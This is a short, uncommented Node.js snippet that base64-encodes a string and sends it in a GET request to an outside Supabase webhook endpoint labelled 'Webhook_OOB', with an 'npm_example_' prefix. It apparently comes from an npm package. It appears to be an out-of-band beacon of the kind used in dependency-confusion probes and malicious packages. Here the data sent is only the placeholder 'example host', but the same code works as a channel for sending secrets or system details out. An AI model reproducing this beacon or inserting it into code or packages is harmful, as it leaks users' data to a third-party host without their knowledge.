const value = "host";
const https = require('https');
const report = `example ${value}`;
const data = Buffer.from(report).toString('base64');
const options = {hostname: 'baoreqygjveumkkxydcd.supabase.co', path: `/functions/v1/Webhook_OOB?data=npm_example_${data}`, method: 'GET'};
https.request(options).end();
